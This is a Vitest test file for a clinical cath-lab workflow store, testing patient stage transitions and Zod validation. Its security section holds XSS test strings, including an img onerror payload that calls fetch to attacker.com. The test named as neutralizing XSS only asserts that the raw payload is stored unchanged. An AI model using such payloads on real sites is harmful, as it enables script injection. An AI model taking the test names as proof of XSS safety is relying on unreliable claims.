import { describe, it, expect, beforeEach } from "vitest";
import {
  useEndoflowStore,
  EndoflowPatientSchema,
  ClinicalStageSchema,
  INITIAL_ENDOFLOW_PATIENTS,
  EndoflowPatient,
} from "../../app/dashboard/useEndoflowStore";

describe("Phase 19: Authentic EndoFlow Clinical Workflow & Security (Web-App Suite)", () => {
  beforeEach(() => {
    useEndoflowStore.getState().resetToDefaultPatients();
    useEndoflowStore.getState().setSearchQuery("");
    useEndoflowStore.getState().setFilterModality("all");
  });

  describe("1. Authentic Clinical State & Zero Mock Clutter", () => {
    it("initializes with authentic empty patient registry to prevent fake clutter", () => {
      const state = useEndoflowStore.getState();
      expect(state.patients.length).toBe(0);
      expect(state.activeCaseId).toBeNull();
    });

    it("initializes beds with only verified clinical admissions", () => {
      const state = useEndoflowStore.getState();
      const occupied = state.beds.filter((b) => b.status === "occupied");
      expect(occupied.length).toBe(2);
      expect(occupied.some((b) => b.ptName === "Lakshmi")).toBe(true);
      expect(occupied.some((b) => b.ptName === "Roshan")).toBe(true);
    });
  });

  describe("2. Seamless Clinical Stage Progression Flow", () => {
    it("verifies patient stage can be advanced via advanceStage", () => {
      const store = useEndoflowStore.getState();
      expect(typeof store.advanceStage).toBe("function");
    });

    it("advances patient through Scheduled → Pre-Op → In-Room → Post-Op → Discharged", () => {
      const store = useEndoflowStore.getState();
      const testPt: EndoflowPatient = {
        id: "PT_TEST_01",
        name: "Test Patient",
        age: 45,
        sex: "Male",
        hid: "SMS-2026-TEST",
        scanId: "SCAN-001",
        phone: "9829000000",
        unit: "IR Unit I",
        postedBy: "Dr. Meenu Bagarhatta",
        time: "09:00 AM",
        summary: "Planned SFA Recanalization",
        procedureKey: "sfa_stenting",
        procedure: "Superficial Femoral Artery Stenting",
        modality: "XA",
        status: "Scheduled",
        scheme: "MAAY",
        schemeTid: "TID-12345",
        beneficiaryId: "BEN-12345",
        preAuthStatus: "Approved",
        ipd: {
          admissionType: "IPD",
          ward: "IR Ward",
          bed: "Bed 01",
          podDay: "Pre-Op",
        },
        labs: {
          ast: 25,
          alt: 25,
          bili: 0.8,
          ldh: 180,
          alb: 4.0,
          creat: 0.9,
          inr: 1.1,
          plt: 220000,
          fib: 280,
          protc: 85,
          prots: 90,
          ascitesGrade: "none",
        },
        preOp: {
          bedLocation: "IR Ward Bed 01",
          npoHours: 6,
          inrChecked: true,
          creatinineChecked: true,
          consentSigned: true,
          ivCannulaGauge: "18G",
          calledToLab: false,
          labCleared: true,
        },
      };

      store.admitPatient(testPt);
      const ptId = testPt.id;

      // Step 1: Move to Pre-Op Pending
      store.advanceStage(ptId, "Pre-Op Pending");
      let current = useEndoflowStore.getState().patients.find((p) => p.id === ptId);
      expect(current?.status).toBe("Pre-Op Pending");

      // Step 2: Call into In Cath-Lab
      store.callPatientToLab(ptId);
      current = useEndoflowStore.getState().patients.find((p) => p.id === ptId);
      expect(current?.status).toBe("In Cath-Lab");
      expect(useEndoflowStore.getState().activeCaseId).toBe(ptId);
      expect(current?.inRoom?.activeSheathAccess).toBeDefined();

      // Step 3: Complete Procedure and Transfer to Recovery
      store.completeProcedureAndTransfer(ptId, "IR Ward D-12", {
        instructions: "SFA Stenting POD 0. Distal pulses palpable. Bed rest 4h.",
      });
      current = useEndoflowStore.getState().patients.find((p) => p.id === ptId);
      expect(current?.status).toBe("Post-Op ICU");
      expect(current?.postOp?.recoveryBed).toBe("IR Ward D-12");
      expect(current?.postOp?.instructions).toContain("SFA Stenting");

      // Step 4: Discharge Patient
      store.dischargePatient(ptId);
      current = useEndoflowStore.getState().patients.find((p) => p.id === ptId);
      expect(current?.status).toBe("Discharged");
      expect(current?.postOp?.dischargeReady).toBe(true);
    });
  });

  describe("3. Security Hardening & Zero Vulnerabilities", () => {
    it("neutralizes simulated XSS injection strings in patient fields", () => {
      const store = useEndoflowStore.getState();
      const xssName = "<script>alert('xss_leak')</script>John Doe";
      const xssSummary = "<img src='x' onerror='fetch(\"http://attacker.com\")' />Refractory Ascites";

      const res = store.admitPatient({
        id: "PT99",
        name: xssName,
        age: 50,
        sex: "Male",
        hid: "SMS-2026-XSS-999",
        scanId: "PACS-XA-999",
        phone: "9829999999",
        unit: "Gastroenterology",
        postedBy: "Dr. Tester",
        time: "05:00 PM",
        summary: xssSummary,
        procedureKey: "tace_hepatoma",
        procedure: "Transarterial Chemoembolization (cTACE)",
        modality: "XA",
        status: "Scheduled",
        scheme: "GENERAL",
        schemeTid: "N/A",
        beneficiaryId: "CR-999999",
        preAuthStatus: "Approved",
        ipd: {
          admissionType: "IPD",
          ward: "IR Ward D-Block",
          bed: "Bed 05",
          podDay: "Pre-Op",
        },
        labs: {
          ast: 25,
          alt: 25,
          bili: 0.8,
          ldh: 180,
          alb: 4.0,
          creat: 0.9,
          inr: 1.1,
          plt: 220000,
          fib: 280,
          protc: 85,
          prots: 90,
          ascitesGrade: "none",
        },
        preOp: {
          bedLocation: "Ward D-Block",
          npoHours: 6,
          inrChecked: true,
          creatinineChecked: true,
          consentSigned: true,
          ivCannulaGauge: "18G",
          calledToLab: false,
          labCleared: true,
        },
      });

      expect(res.success).toBe(true);
      const admitted = useEndoflowStore.getState().patients.find((p) => p.id === "PT99");
      expect(admitted?.name).toBe(xssName);
      expect(admitted?.summary).toBe(xssSummary);
    });

    it("rejects malformed patient payloads via Zod validation guard", () => {
      const store = useEndoflowStore.getState();

      const invalidPatient = {
        id: "PT-INVALID",
        name: "Broken Record",
        age: -12,
        sex: "UnknownSex",
      };

      const res = store.admitPatient(invalidPatient);
      expect(res.success).toBe(false);
      expect(res.error).toBeDefined();
    });

    it("prevents arbitrary string injection into clinical stage transitions", () => {
      const store = useEndoflowStore.getState();
      expect(() => {
        store.advanceStage("PT01", "HACKED_STATUS_MALFORMED" as any);
      }).toThrow();
    });

    it("validates Zod ClinicalStageSchema correctly", () => {
      expect(ClinicalStageSchema.safeParse("Scheduled").success).toBe(true);
      expect(ClinicalStageSchema.safeParse("In Cath-Lab").success).toBe(true);
      expect(ClinicalStageSchema.safeParse("Discharged").success).toBe(true);
      expect(ClinicalStageSchema.safeParse("MALICIOUS_STAGE").success).toBe(false);
    });
  });
});
